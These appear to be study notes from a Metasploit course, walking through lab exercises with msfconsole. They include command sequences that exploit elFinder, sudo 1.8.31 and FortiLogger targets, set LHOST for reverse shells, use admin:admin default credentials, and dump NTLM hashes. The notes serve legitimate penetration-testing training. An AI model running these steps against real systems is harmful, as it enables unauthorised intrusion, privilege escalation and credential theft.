# Using Metasploit Framework

## Metasploit Project

a) Metasploit Framework -> Free, open-source, community driven

b) Metasploit PRO -> Paid, Commercial use, enterprise oriented

### Architecture

Modules (/usr/share/metasploit-framework/modules)

Plugins (/usr/share/metasploit-framework/plugins/)

Scripts (/usr/share/metasploit-framework/scripts/)

Tools (/usr/share/metasploit-framework/tools/)



### Intro to msfconsole (free)

Launching -> `msfconsole` or `msfconsole -q` (without banner)

Modules -> prepared scripts to exploits

* Syntax -> \<type>/\<os>/\<service>/\<name>&#x20;
  * exploit/windows/ftp/scriptftp\_list
* Search -> `help search` f.e.: `search eternalromance`
* Specific search -> `search type:exploit platform:windows cve:2021 rank:excellent microsoft`
* `Module selection -> nmap -sV <IP> ->` ![](<.gitbook/assets/image (17).png>)
  * `search ms17_010 -> use 0 -> options -> info`
    * `set RHOSTS <IP>... run`

#### Example of usage

`nmap -sVC 10.129.2.141`

`msfconsole -q`

`search eternalromance`

`options`

`set RHOSTS 10.129.2.141`

`set LHOST 10.10.14.153`

`run`

find flag.txt

### Payloads

refers to a module that aids the exploit in returning a shell to the attacker

* exploit -> finds the vuln service
* payload -> establishes a foothold

#### Example of usage

`nmap -sVC 10.129.152.95`

`msfconsole -q`

`search Apache druid`

`use 0`

`options`

`set LHOST 10.10.14.153`

`set RHOSTS 10.129.152.95`

`run`

find flag.txt



## MSF Sessions



### Sessions & Jobs usage

The target has a specific web application running that we can find by looking into the HTML source code. What is the name of that web application?

`nmap -sVC 10.129.79.219`

elFinder



Find the existing exploit in MSF and use it to get a shell on the target. What is the username of the user you obtained a shell with?

`msfconsole -q`

`search elfinder`

`use 3`

`set LHOST, RHOSTS`

`run`

`shell`

`whoami` -> www-data



The target system has an old version of Sudo running. Find the relevant exploit and get root access to the target system. Find the flag.txt file and submit the contents of it as the answer.

`shell`

`sudo -V` -> version 1.8.31

msf -> `sessions`

msf -> `search sudo 1.8.31`

`use 0`

`set LHOST, SESSION`

`run`

`cd root`

`cat flag.txt`

{% embed url="https://www.youtube.com/watch?v=we0cYx37lMo" %}

### Meterpreter

* meterpreter payload is a specific type of multi-faceted extensible payload that uses DLL injection to establish connection
* difficult to detect using simple checks, can be configured to be persistent across reboots or system changes...
* resides entirely in the memory of the remote host...leaves no traces on HDD
* "swiss army knife of pentesting"



#### Questions

Given IP: `10.129.203.65`

1. Find the existing exploit in MSF and use it to get a shell on the target. What is the username of the user you obtained a shell with?

`sudo service postgresql status`

`sudo systemctl start postgresql`

`sudo msfdb init`

`sudo msfdb status`

`sudo msfdb run`

msf -> `db_nmap -sV -p- -T5 -A 10.129.203.65`

<figure><img src=".gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

msf -> `hosts`

<figure><img src=".gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

msf -> `services`

<figure><img src=".gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

5000 -> HTTP -> go to website 10.129.203.65:5000

* it is running FORTILOGGER
* tried credentials admin:admin -> worked

msf -> `search FortiLogger`

msf -> `use 0`

msf -> `set LHOST tun0`

msf -> `set RHOSTS 10.129.203.65`

msf -> `run`

<figure><img src=".gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

`shell`

`whoami`

<figure><img src=".gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

ANSWER: **`nt authority\system`**

2. Retrieve the NTLM password hash for the "htb-student" user. Submit the hash as the answer.

msf -> `exit`

msf -> `run post/windows/gather/hashdump`

<figure><img src=".gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>
